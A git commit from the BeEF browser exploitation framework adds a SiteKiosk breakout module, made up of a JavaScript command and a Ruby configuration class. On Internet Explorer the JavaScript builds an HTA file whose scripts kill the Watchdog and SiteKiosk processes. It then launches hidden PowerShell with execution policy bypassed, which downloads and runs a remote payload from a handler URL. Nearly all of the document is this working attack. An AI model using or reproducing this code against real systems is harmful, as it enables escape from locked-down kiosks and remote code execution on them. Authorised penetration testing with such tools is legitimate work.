c24a8c2ec5f568d259eaa3e7e28c055fa62b52fa
antisnatchor <antisnatchor@gmail.com>
2014-09-07 23:18:41 +0200

    Added @insertscript module to break-out from SiteKiosk

---
+++ modules/social_engineering/sitekiosk_breakout/command.js
@@ -0,0 +1,20 @@
+//
+// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+
+    if(beef.browser.isIE()){
+        // application='yes' is IE-only and needed to load the HTA into an IFrame.
+        // in this way you can have your phishing page, and load the HTA on top of it
+        // beef.dom.createIframe('hidden', {'src':hta_url,'application':'yes'});
+	bb = new MSBlobBuilder();
+	bb.append('<script>new ActiveXObject("WScript.Shell").Run(\'taskkill.exe /F /IM Watchdog.exe\');<\/script>');
+	bb.append('<script>new ActiveXObject("WScript.Shell").Run(\'taskkill.exe /F /IM SiteKiosk.exe\');<\/script>');
+	bb.append('<script>new ActiveXObject("WScript.Shell").Run(\'powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring(\\\\\\"<%= @payload_handler %>\\\\\\"))"\');<\/script>');
+	window.navigator.msSaveOrOpenBlob(bb.getBlob(),"BREAKOUT.hta");
+        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'HTA loaded into hidden IFrame.');
+    }
+});
---
+++ modules/social_engineering/sitekiosk_breakout/module.rb
@@ -0,0 +1,29 @@
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+class Sitekiosk_breakout < BeEF::Core::Command
+
+  def pre_send
+
+    # gets the value configured in the module configuration by the user
+    @datastore.each do |input|
+      if input['name'] == "payload_handler"
+        @payload_handler = input['value']
+      end
+    end
+
+  end
+
+	def self.options
+		return [
+			{'name' => 'payload_handler', 'ui_label'=>'Payload Handler',  'value' =>'http://10.10.10.10:8080/psh'}
+		]
+	end
+
+	def post_execute
+		save({'result' => @datastore['result']})
+	end
+
+end
